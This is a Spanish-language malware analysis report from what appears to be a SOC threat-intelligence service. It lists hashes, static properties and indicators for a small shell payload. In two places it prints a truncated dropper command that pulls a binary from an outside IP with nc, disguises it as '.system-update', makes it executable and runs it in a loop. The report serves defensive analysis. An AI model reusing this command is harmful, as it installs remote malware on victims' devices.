# 🧬 Payload Analysis

`9ec0680c88c20f69df67aeb8d42406a10356412220582ef072b79644c12ed752`

## 📌 Resumen

Artefacto clasificado como **Payload** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Cambio de permisos, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Payload`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:31:49+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `9ec0680c88c20f69df67aeb8d42406a10356412220582ef072b79644c12ed752`
- **MD5:** `509404a55282b6712e799ab7d7e516c3`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text |
| Tamaño | 154 B |
| Entropía | 4.74 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Cambio de permisos**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text; iocs=3

## 🖥️ Comandos observados / extraídos

```text
sh -c "cd /data/local/tmp; nc 85.11.167.XXX 25565 > .system-update; chmod +x .system-update; (while true; do ./.system-u
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 85.11.167.XXX | static_analysis |
| hash | 9ec0680c88c20f69df67aeb8d42406a10356412220582ef072b79644c12ed752 | static_analysis |
| command | sh -c "cd /data/local/tmp; nc 85.11.167.XXX 25565 > .system-update; chmod +x .system-update; (while true; do ./.system-u | strings |
| ip | 5.59.109.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
